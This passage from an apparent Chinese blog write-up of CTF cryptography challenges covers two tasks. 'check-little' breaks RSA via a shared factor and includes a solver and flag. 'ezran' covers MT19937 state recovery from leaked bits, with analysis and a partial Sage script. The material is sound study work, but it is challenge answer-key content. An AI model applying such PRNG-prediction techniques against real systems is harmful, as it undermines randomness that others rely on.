保证e和phi互素</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> phi % e != <span class="number">0</span>:    <span class="comment"># e和phi是互素的</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 对key进行rsa加密</span></span><br><span class="line">N = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(key, e, N)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对flag进行AES加密,密钥为key</span></span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">ciphertext = AES.new(key = long_to_bytes(key)[:<span class="number">16</span>], iv = iv, mode = AES.MODE_CBC).encrypt(pad(flag.encode(),<span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;N = <span class="subst">&#123;N&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;iv = <span class="subst">&#123;iv&#125;</span>\n&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&#x27;ciphertext = <span class="subst">&#123;ciphertext&#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N = 18795243691459931102679430418438577487182868999316355192329142792373332586982081116157618183340526639820832594356060100434223256500692328397325525717520080923556460823312550686675855168462443732972471029248411895298194999914208659844399140111591879226279321744653193556611846787451047972910648795242491084639500678558330667893360111323258122486680221135246164012614985963764584815966847653119900209852482555918436454431153882157632072409074334094233788430465032930223125694295658614266389920401471772802803071627375280742728932143483927710162457745102593163282789292008750587642545379046283071314559771249725541879213</span></span><br><span class="line"><span class="string">c = 10533300439600777643268954021939765793377776034841545127500272060105769355397400380934565940944293911825384343828681859639313880125620499839918040578655561456321389174383085564588456624238888480505180939435564595727140532113029361282409382333574306251485795629774577583957179093609859781367901165327940565735323086825447814974110726030148323680609961403138324646232852291416574755593047121480956947869087939071823527722768175903469966103381291413103667682997447846635505884329254225027757330301667560501132286709888787328511645949099996122044170859558132933579900575094757359623257652088436229324185557055090878651740</span></span><br><span class="line"><span class="string">iv = b&#x27;\x91\x16\x04\xb9\xf0RJ\xdd\xf7&#125;\x8cW\xe7n\x81\x8d&#x27;</span></span><br><span class="line"><span class="string">ciphertext = bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="check-little分析"><a href="#check-little分析" class="headerlink" title="check-little分析"></a>check-little分析</h3><ul><li>这题感觉有点幽默，通过对代码的分析，首先我们是先要求解RSA加密获取<code>key</code>。但是这个题目就给了<code>n</code>、<code>c</code>，并且<code>n</code>是很难硬分解出来的。<code>2025.12.2</code>是可以用<code>factordb</code>查到的，但是当时比赛是查不到的。</li><li>这里其实有个非常小细节就是<code>gcd(c,N)!=1</code>，这其实就说明了<code>c</code>就是<code>N</code>的一个因子，这样<code>N</code>就可以直接被分解了，<code>key</code>直接可以求了，剩下的就是正常的<code>RSA</code>解密和<code>AES</code>解密操作了。</li></ul><h3 id="check-littleexp"><a href="#check-little—exp" class="headerlink" title="check-little—exp"></a>check-little—exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">N = <span class="number">18795243691459931102679430418438577487182868999316355192329142792373332586982081116157618183340526639820832594356060100434223256500692328397325525717520080923556460823312550686675855168462443732972471029248411895298194999914208659844399140111591879226279321744653193556611846787451047972910648795242491084639500678558330667893360111323258122486680221135246164012614985963764584815966847653119900209852482555918436454431153882157632072409074334094233788430465032930223125694295658614266389920401471772802803071627375280742728932143483927710162457745102593163282789292008750587642545379046283071314559771249725541879213</span></span><br><span class="line">c = <span class="number">10533300439600777643268954021939765793377776034841545127500272060105769355397400380934565940944293911825384343828681859639313880125620499839918040578655561456321389174383085564588456624238888480505180939435564595727140532113029361282409382333574306251485795629774577583957179093609859781367901165327940565735323086825447814974110726030148323680609961403138324646232852291416574755593047121480956947869087939071823527722768175903469966103381291413103667682997447846635505884329254225027757330301667560501132286709888787328511645949099996122044170859558132933579900575094757359623257652088436229324185557055090878651740</span></span><br><span class="line">iv = <span class="string">b&#x27;\x91\x16\x04\xb9\xf0RJ\xdd\xf7&#125;\x8cW\xe7n\x81\x8d&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&quot;bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2&quot;</span></span><br><span class="line">p = gmpy2.gcd(N,c)</span><br><span class="line">q = N//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">key = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">flag = AES.new(key = long_to_bytes(key)[:<span class="number">16</span>], iv = iv, mode = AES.MODE_CBC).decrypt(<span class="built_in">bytes</span>.fromhex(ciphertext))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;m_m4y_6e_divIS1b1e_by_p?!&#125;\x01&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ezran复现"><a href="#ezran-复现" class="headerlink" title="ezran(复现)"></a>ezran(复现)</h2><ul><li><p>唉，MT19937可恶啊。这题其实是鸡块师傅的这题改编的：<a href="https://tangcuxiaojikuai.xyz/post/69eaef2e.html">2024-同济大学第二届网络安全新生赛CatCTF-wp-crypto | 糖醋小鸡块的blog</a></p></li><li><p>当时8月底打一场国外的比赛遇到的一题MT19937就是参考鸡块师傅的博客，当时数据量要<code>3w</code>多位才能完全恢复出状态，而这题位数还是不太够，所以需要进行解空间的爆破。其实有个妙妙小工具也能梭出来<code>gf2bv</code>，当时我使用工具的能力比较弱（其实是github项目用少了），所以当时没解出来。附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read().encode()</span><br><span class="line"></span><br><span class="line">gift=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3108</span>):</span><br><span class="line">    r1 = getrandbits(<span class="number">8</span>)</span><br><span class="line">    r2 = getrandbits(<span class="number">16</span>)</span><br><span class="line">    x=(<span class="built_in">pow</span>(r1, <span class="number">2</span>*i, <span class="number">257</span>) &amp; <span class="number">0xff</span>) ^ r2</span><br><span class="line">    c=long_to_bytes(x, <span class="number">2</span>)</span><br><span class="line">    gift+=c</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">list</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2025</span>):</span><br><span class="line">    shuffle(m)</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;&quot;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,m)))</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;gift = <span class="subst">&#123;bytes_to_long(gift)&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">gift = 168493851417703588548717029794221613683761608041893136816774988942210201994806596486241111040187799315220699962492746016622155912284478083344259006047064466530066578534091640506252873545847613733060767421165922910165849223819724771556996494266348599637799951498602746172472474043560918655182558487306147173253422369304357435106491753842966797366083372732187941143068734603010312527404336466872564527614092461890866282112524694045530645483351579829711345854763872431079756099257846824411200253257412109940610074137453609429041768315883551396484832248218440113814690879176881687180871131579058837471639695650265190318205178745361186935073271386611844568108740911432765331701793516302479246166940357105837539690883141119997463237787269212088455618829028396141005651196540503521066330522509838601645943511333185114892199238804955409944054580101299762416568219273861856063968915778941693176764489855938839698256364144488179689211978865667664960974878815407643617282227532221450793227770838900181538687328919426450353603081046514391056461591616216174009564828843707591227954891786703350759224277926318809808916410247674897941670422240963148473953456558821728749123626200027671191982247693679320607183589299528206704194601764177572496360544233768450334735712130130267581340473331353959190088742584494613208621185990632619860141405411912362432728314322393818385848897904107372834186852716970816090008535161448034423990041916009648137380343725290836775326114110274297749483275940368625477003758746335205804977399820156745981465674830234199739248323149920058375324189144098449040510165605599458203741111522470947119730428547366691770715499413413367529743515266704349704141893342205653261207573638394517048371086026935449076404131938571829516285438664643052705129346171620305094633510113532012518080462416793927818576509658195145842246681747695169502030819509383635202280717014577664499834243197295627676018865483714537820388177766992132798129191494911804570469818465200777734403184265543159071263368755317395255554623840647940421572348146098288636827691036469237652040438008490132448405920269576786515196909991808788190663314609718567977418756106336887801228631042101707150590778917653022698331038106663437419288867731238438974857826512317644423825015482995502748048206587269708329220808512323086479093516682323995943159594153689815953716344041199370981611848579119408833415948562059814210905818824768361943190988815461054362969297170250868283106431908804969364570767898276942355588586201537328329555492933975347157845507467193525308842838922853952185951465585564371084689967013599756600669180450671906969207277808236924055454456323048624210292100010384416255592649537647364576659170150625584323352123247168198638226619163027688540581648696604690724205148206306078743930680961252222413069308924238013053548949456240829095233716884614992348767770353902785194229005549790110818067697079300400832975076321181834948608058029427984144412690313236628832273251119172920527016646462300384279812560851195411807901786126153814197537929318116538207661749739802255592321185567803336550526046751031827918408436270971418573611110272244522797326168508440974669471102704086154712467229767007412708489552997134330599967136855440643823197416253318501533253961177861839734562906960677177191296915438859535839385101738412308133060913812362676311701827892895826967801247055868010508514803882411916740617763330851481821357109368266599800725772299802181413015445056166093973467525125713181250957286546610875608141940922097741930867719210284539977034794377276046216869908197219748642399481675159424498269862517396003734200216571003560672579890552614742052223540985540162478857796689280542024723006813567335654906992190541607296917467063921670189747472977788786797984813763833031273280079685938029446657798855083584914451049893181048484027139228324080204617400363957985750180825578886286185301649760717949114498059935930230776757232268970788743924384740113941177088825111402056058560091241917400854587003809758329735364976823137892709942906021831251875124127014738247486619844929640889666809812546545482616407312817428260053152265008980921269336014371027735299470358749333693299873458627014498551508036270558633130409491016980345737815189857926198294051167009177308050198495661521884173111351282983232002528597548808405359209793508276795878408898109157480721822043763048509487760260914787394724796900130259669249322104550043050295843426053619143506356701887926133161397252316191665703977797375968789166426798609142945518729878825039416320146590559698920980735734926326829887743628616283774550706084762275195050233768249528399370223480483573173789683015959162952747401299202300615444495060713207212029005004781805394348840556694826773523388071106795229775184137117169345825631149389393335822472640201582322934410227038258131804594515738906940260945039107931989653815482631344077833583674747882139716729982457484272907922461298302691722189927789093004927951214154185612998105538140218768518835907645893611051501742990263966496343954351812667851336184166315571117781294769417772968176133922513129290211216331510343345615548585203381885876397451117054415208746526772935486316312280346780339557434902966064490393223591726168112612485182060381625142739407136386838698493591285225829633806595288501031920044842858964735938709519430596531452418314167933031091088243078598705921489546662233098883237811401550435847344424884875136695432722854251823650967320593784144581122999707396159318953810071294133085807571286691522998454756288760672781095120756155934800053661085151349528042941271025105627141228121312183781093524628304563024568724621004583181965115677027654535329509223623711837683004368160755347251275152846320719324782344712005146071533391473079356983500614195011009148044454454873708756931869127156187628973982892766265397622022779482753909630895602249544516155313101983226382016896264514030588482631639061413056529159330904547406464740687518642381719947115472352642965284455916539920180703687636932569612103281662773321645016403573081442555415478555267522617495382486265189493056670210622806648557137456700010484764522959909403897179697159987743346852919441332951029088194266645495052129093922734653699393094584771740829582526400019974648845736936686530160754108593021094404924829058765855081897870767489173993652058930379223784456127651434421716813086210463969954908410736427401637368317270314952898170230256621585374583259521686881860428617596074255172598000166884433515535224633918704702506976106954489894438988035475482478659220826019109727636992564606929421199714900264505777534558969766567251618146548564421797629250332818161509449786969751607653312145896569104292005257731290816757394835852600798564162794437122331967096002340499686038514511604260108200599893274980535536348086056443621353450341785921696773115280237051561047128911658523418825115852843140433443107525091329268119661186936379808894189794342282730927558335699236591131639713223692727396901760063493070892397653845538093433461755881285777739438006345613527663101043270352441099716442072623979257566288652679776019536163617934043077102344924025363069426420688034206194048899752907223079862819616321851661199550570090144503343274070627419179357938404281319390921222004519213551656632572744987591847186607702016700277931409469827365666817644659309100672534208785365165935945597102256768997709598501865595720238860104083787650265521799657285801871788637907076516942812657323933618553987201215239634054943665806392720693725004488122455402541570538958091762154853469417723670571641953991788395118994606211028369090807826653085900823465675545619366377489305770624968222477418354279437216570990595559271827983774793454101247475591009345799502913307747100958605918274479348791986223902872331880355946742709053205621530700838263031234951631365888771641521741764818194258504664327855170147101641348821394515822264738408349751925191707430282001017906385701671352359601132194782242048511004555673046006254330652420587925083578518856512666826499610305872066985753845930335564637262577438736274913519961224355548369802962173071608763367681292829107900388008707743642136962073886928649252424138555798240202206569775490092983842230556381691697884252208596681448806582534316946356373697456734902187543552004615679703337442043938275736043470456261826461905157577862665448393624236153896285652844792760676753951361073793718620302729363783145798685301281402457075497195164156671519875316730930158860981310238913709302769377672139044871895747981515821913830167116036579550827490216146414731711539609182026971124878221183569632145365050946877178781401463433570750229474813041714717779124448659121761348052104029147518031300549513989734284494649558783587139960761537723536563270642603395470163134989657819651927267492277298303240457967850451107927094542742628447568368596851090351007083518513464560901681497519213614739681522617598542336034012634191704512551178275303255158438113925469179379911878664107132007624661067404008585378828525681656060812305908324711180668403000576404679210643509997419173588278754074649318636571227234890423407653662478745778378319815710685142053712905271904165602950296182076509335716478344811534057186580167627036593458289412629367073684123180839866932864944868279723281447500329937623117512717700212960779439517550150946217707596577363427457179599947854965056380390507794719595599930568222672322355416529130802012222818613537543588137522406062006231252979399041237771012273641743242025088456484974031330751969278092971659432729692391293640785127451282151272181548942872988202096583409080071077968423122208960101107657872567645475483323168346722624382859919894601983898537640010732849734647606020695045634884115530526789717267728964590479548802570902597153508480108015086705714481111264932711109224295459481444086335381805764426243097780585123582478461428010185950063222224859982397153536527078581818291026521376862563009669136823809309127444143642673463208329361566308965293931266918196509026968543210064758347471246933113880162067519147262120645556641685197207047017759694064455060486281732683369694416564529492377163716345666241275926864922933171087108464358560211280941258697553522999266180689771179727292478771528221828851087567288839446172973694751012301360534171677733326606738089910275045432153788159230039696414358460436841602367381212353442816939675481067398292449946144405092354544850059304240577087356525899638198286468890191905940391258948679170390872430049524454817902695192174810012823951487132448131147778173534582079047573969695541089656254494953917746391729239764270786159530911865799259089144893340544019903380236730096930510948311431664625701812394224108355031348983767807007733995475203929460297531830490680846870035768250706455068456396334167349991040356791060481433668917495028306239719492735659808613643729867579857349355122376151990028116090613848018520522180698735212767495845988215952380311723140188953600368421317307115717372457501814237336740158617839714895844957819058335596849089973521915138404898088143552838334259663978278219327462108589459385899936933033590983574142032933324318927911890125907745125415285798799105530150785456202008388274097343913758794377987872768886339692168774118500460401470497790982170128141832738487277992704865618776698531872303791378736997573603036100098971532260222130994641985774305486234979211180329206484393237755281202654908807836494268032588469956586716574623054373853676060777780197200492259764149326966747483207571822670401570709160125427927195543385833197997978702295065602080525707398489721265792076256922889988560399502486991785445062061460672236493808356657152300669412399328409760246210387834338912933769395441870485774327737818508553732802388180761694142742042964001434043601041144625674461214793829972264525885941186575615217273991850163942264811525882604106881908363769928217600051223717201947136231968415848044744474281498298957726186753431215269507321805270052778556811511980874699282662907056554402480904580169516559538216392351173091883441891607626462557361134362740046358642201188427094689840558512721672012304580653503208840304566592466300203607983416437762350170466124829501124888762570873134134213950286972435708743564005936867142074772153478519856332130182123520084539527285574304599545645392002942661422250871599164382198478679901087658037827204190354503412285407799905474501153421079698984575159483134766387822378103803433599740550121804420653196302569920093145544532220531107782917887209130431012125552695034836034185047067326711077432723144332970596459355609117758439373083370085174578039829567702065388412723720292451931407638929074433294867067812882674520842748717297122444477867255523551832264816501540483010927336323563407428875048110936932133778257192406090187127172094554944548966329662641419042835092529355037357386093634896695932363708039821469338663314461436450908042186769072187268145069579756649696849981676364231931604714583809341713707219055247479653248424128544144545947424377402338229784169585279142084829555450236705376851288238731729768068428271237677964366905196935722944638218205931434731904109882014664652759645959371898949487300643707583744559952690450344614412461417591800483386921320530809237552281364618318594473804432590562468160117595272656725615802510107325760661561079343962125426744218871939196710181026897980078141920988235351415044551317578490754118804749165975894016505409390844062060028941604653878185582599032667959036429725924232941469263326353068145244808076568900497747172317041455727390079072969862893686010604759845470389930035725699372069559369810605128343708422439234650907531173725146444987385722370497088235384491930636269563984872141157485720925361530642765388373189075507980495838688064146115160226038643055659624122211567738061135537839985700945316654234791732682545564489284192346768545308382695839487097631067536886406430379115297019613758386433439672594062059682694079538310265728673800061679012209864122810657231573862064831536614619574958883295226021688953682076869363345338388197948013325224897171199708338473670892392317330187578938134262639370272395368653547105078041663335625740377268391401135556647689821556159565311060931009729254442622790349828965979939000391555466376502822227509927802776246004396874915461629678844701775744322142498901374447391767675442115844473244665993898581112624180236027979489508415176900978549876311339598005664940334460083100712835230851859311666413963296894887994552731984601621609846509659638381394337394062813836175696154228766792597888196115903622293677491319485870597771257210897437815934820082933124015647249436688864274331900509908481698145094449067375676528933942279038838563423823884900289677915579824146082390954266834471175956313778453814060119691398710720689085758791466226225762543591370329144706415171050851661675785510003777925152328720809158576440802021714017825707601419487298473299703156511815459448914505862019500821751317490526865631996154165747978597812922432590371048023310017203060092344405806613937640514811171581563443248712048158</span></span><br><span class="line"><span class="string">c = )9Lsu_4s_eb__otEli_nhe_tes5gii5sT@omamkn__ari&#123;efm0__rmu_nt(0Eu3_En_og5rfoh&#125;nkeoToy_bthguuEh7___u</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="ezran分析"><a href="#ezran分析" class="headerlink" title="ezran分析"></a>ezran分析</h3><ul><li><p>感觉分析写到后面逻辑性有点问题</p></li><li><p>根据题目附件的代码就会发现这个其实是<code>MT19937</code>的伪随机数预测的题目。首先来看看到：</p></li></ul><script type="math/tex; mode=display">r_1 =getrandbits(8)\\r_2 = getrandbits(16)</script><ul><li>然后会接下来其实要注意到的是下面这个式子，因为我们得到的<code>gift</code>就是与下面这个式子相关的。</li></ul><script type="math/tex; mode=display">x=((r_1^{2i}~mod(~257))~~\&~~0xff)\oplus~r_2</script><ul><li>首先注意到$r_1^{2i}~mod(~257)$，其中<code>257</code>是一个素数，由欧拉判别定理可以得到如下结论，若$(r_1,p)=1$，则$r_1$是模p的平方剩余有：</li></ul><script type="math/tex; mode=display">r_1^{\frac{p-1}{2}}=r_1^{128}\equiv1~mod(~257)</script><ul><li>然后再注意到$r_1$是模p的平方非剩余有：</li></ul><script type="math/tex; mode=display">r_1^{\frac{p-1}{2}}=r^{128}=-1~mod(~257)</script><ul><li>所以当$2i=128k$，也就是$2i$是<code>128</code>的整数倍的时候就只会出现上面两种可能，也就是<code>i</code>是<code>64</code>的整数倍的时候会出现上面的两种可能。此时当转换为$[0,p-1]$这个范围内就有：</li></ul><script type="math/tex; mode=display">r_1^{\frac{p-1}{2}}\equiv 1~mod(~257)=0b00000001\\r_1^{\frac{p-1}{2}}\equiv256~mod(~257)=0b100000000</script><ul><li><p>注意到结果会<code>&amp;0xff</code>，这就说明一点异或只会改变$r_2$低8位的数据，而$r_2$高8位的数据是始终泄露出来的，所以就有如下结论：</p><ul><li>当$i$是一般情况的时候，$r_2$的高8位始终能泄露出来，低8位不知道情况</li><li>当$i$是64的倍数的时候，$r_2$的高15位始终能泄露出来，低1位不知道情况</li></ul></li><li><p>所以对于<code>3108</code>个的$r_2$，可以泄露的位数为：</p><ul><li>一般情况<code>3108×8=24864</code>，这种情况是包可以恢复出来的。</li><li>特殊情况<code>i</code>是<code>64</code>的整数倍时，还可以泄露出$\lfloor\frac{3108}{64}\rfloor×7=48×7=336$</li><li>最终可以泄露：<code>24864+336=25200</code></li></ul></li><li>已知<code>19968</code>位是绝对可以恢复出初始状态的，这种就是直接解出矩阵方程即可，已知$\mathbf{b}$，获取$\mathbf{T}$，就可以解出这个线性方程$\mathbf{S}$（也就是state即状态方程），其中这个$\mathbf{T}$应该需要使用黑盒测试来获取（详细原理到时候会开一篇MT19937的文章介绍）：</li></ul><script type="math/tex; mode=display">\mathbf{s}_{1×19968}\mathbf{T_{19968×19968}}=\mathbf{b_{1×19968}}</script><ul><li><p>接下来第一部分恢复已经分析完了，接下来一步就是分析<code>shuffle()</code>这个函数，该函数可以将<code>m</code>这个列表随机打乱，随机打乱使用到的随机数也是来自于上面<code>MT19937</code>的状态，所以只要恢复了<code>MT19937</code>的状态<code>shuffle()</code>部分其实很好解决。</p></li><li><p>接下来先尝试恢复一下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.set_int_max_str_digits(<span class="number">100000</span>)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">gift =  </span><br><span class="line">candidate = []</span><br><span class="line">ct = <span class="string">&#x27;)9Lsu_4s_eb__otEli_nhe_tes5gii5sT@omamkn__ari&#123;efm0__rmu_nt(0Eu3_En_og5rfoh&#125;nkeoToy_bthguuEh7___u&#x27;</span></span><br><span class="line">x = long_to_bytes(gift)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(x)//<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)//<span class="number">2</span>):</span><br><span class="line">    candidate.append(bytes_to_long(x[i*<span class="number">2</span>:(i+<span class="number">1</span>)*<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment">######################################################### part1 recover MT and get seed</span></span><br><span class="line">gift = long_to_bytes(gift)</span><br><span class="line">RNG = Random()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">construct_a_row</span>(<span class="params">RNG</span>):</span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(gift)//<span class="number">2</span>):</span><br><span class="line">        RNG.getrandbits(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.getrandbits(<span class="number">16</span>) &gt;&gt; <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">15</span>))))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            row += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(RNG.getrandbits(<span class="number">16</span>) &gt;&gt; <span class="number">8</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line">    <span class="keyword">return</span> row</span><br><span class="line"></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">19968</span>):</span><br><span class="line">    state = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">    temp = <span class="string">&quot;0&quot;</span>*i + <span class="string">&quot;1&quot;</span>*<span class="number">1</span> + <span class="string">&quot;0&quot;</span>*(<span class="number">19968</span>-<span class="number">1</span>-i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">        state[j] = <span class="built_in">int</span>(temp[<span class="number">32</span>*j:<span class="number">32</span>*j+<span class="number">32</span>],<span class="number">2</span>)</span><br><span class="line">    RNG.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">624</span>]),<span class="literal">None</span>))</span><br><span class="line">    L.append(construct_a_row(RNG))</span><br><span class="line"></span><br><span class="line">L = Matrix(GF(<span class="number">2</span>),L)</span><br><span class="line">R = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="built_in">len</span>(gift)//<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">        R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(candidate[i] &gt;&gt; <span class="number">1</span>)[<span class="number">2</span>:].zfill(<span class="number">15</span>))))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        R += <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, (<span class="built_in">bin</span>(candidate[i] &gt;&gt; <span class="number">8</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>))))</span><br><span class="line"></span><br><span class="line">R = vector(GF(<span class="number">2</span>),R)</span><br><span class="line">s = L.solve_left(R)</span><br></pre></td></tr></table></figure><ul><li>在恢复的时候求解出线性方程组时，就会发现一个问题<strong>泄露的数据量不够</strong>，导致解出来的线性方程组的解的秩$rank(\mathbf{s})&lt;19968$（或者解集$s$维数不为0），导致方程组的解不唯一。所以还需要想办法对这个解进行爆破等操作。</li><li>此时我们先看看这个方程解出来的秩是多少，这里也稍微介绍一下核<code>kernel</code>的概念，因为<code>s</code>是该方程组的一个特解，所以如果直接求<code>s</code>的秩的话一般都是满秩的，所以我们需要求<code>s</code>对应的核空间的一个元素，这样才能得到该方程组的秩，其实也可以使用矩阵$T$计算秩。<ul><li>核的定义：设$A$是域$F$上线性空间$V$到$V’$的一个线性映射，则$V$的子集$KerA:={\alpha\in V|A\alpha=0’}$，称为$A$的核。</li><li>从上面核的定义中可以知道，核其实就是一个映射到$V’$空间且满足$0’$解的集合。</li><li>所以我们先将该特解映射到其核空间中看看维数是否为<code>0</code>，如果维数为<code>0</code>那么解唯一，不为<code>0</code>，那么解就不唯一，需要爆破解。</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R = vector(GF(<span class="number">2</span>),R)</span><br><span class="line">s = L.solve_left(R)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">dim_s = L.left_kernel().dimension()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解集s的维数:&quot;</span>,dim_s)</span><br></pre></td></tr></table></figure><p><img 